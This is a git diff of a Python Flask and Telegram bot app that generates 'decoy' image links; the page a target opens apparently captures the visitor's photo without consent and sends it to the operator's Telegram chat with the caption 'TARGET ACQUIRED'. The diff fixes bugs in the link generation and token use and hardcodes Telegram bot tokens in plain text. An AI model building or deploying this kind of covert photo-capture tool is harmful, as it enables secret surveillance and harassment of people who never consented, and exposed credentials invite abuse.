@@ -5,8 +5,8 @@ from threading import Thread
 import telebot
 
 # --- CONFIGURATION ---
-BOT_TOKEN = "8592897208:AAEhFHK5LC2u_lTBmseas6tFv_LJd9cyCnY"
-CHAT_ID = "8592897208"  # FIXED: Put your actual Chat ID back!
+BOT_TOKEN = "8634734607:AAEuU4phNRxgVa2E1FwHwE0aOr0_R9pJWmI"
+CHAT_ID = "8634734607"  
 
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
@@ -22,7 +22,7 @@ def view_image(image_id):
     """The page the Judge clicks. It shows the decoy and captures their photo."""
     try:
         file_info = bot.get_file(image_id)
-        file_url = f"https://api.telegram.org/file/bot{8592897208:AAEhFHK5LC2u_lTBmseas6tFv_LJd9cyCnY}/{file_info.file_path}"
+        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
         
         return f'''
         <html>
@@ -77,7 +77,7 @@ def capture():
     try:
         data = request.json['image']
         image_data = base64.b64decode(data.split(',')[1])
-        bot.send_photo(CHAT_ID, image_data, caption="🎯 TARGET ACQUIRED: Target's Photo Captured!, if happy with the service pay the owner")
+        bot.send_photo(CHAT_ID, image_data, caption="🎯 TARGET ACQUIRED: Target's Photo Captured!")
         return jsonify({"status": "success"}), 200
     except Exception as e:
         print(f"Capture Error: {e}")
@@ -92,9 +92,9 @@ def welcome(message):
 @bot.message_handler(content_types=['photo'])
 def handle_photo(message):
     file_id = message.photo[-1].file_id
-    # BULLETPROOF FIX: Using simple string addition so no brackets can mess up
-    link = "https://demo-project-1ty6.onrender.com/view/" + str(file_id)
-    bot.reply_to(message, "Decoy Link Generated:\n\n" + link)
+    # THE FIX IS HERE: single brackets instead of double brackets
+    link = f"https://demo-project-1ty6.onrender.com/view/{file_id}"
+    bot.reply_to(message, f"Decoy Link Generated:\n\n{link}")
 
 # --- MAIN EXECUTION ---
 
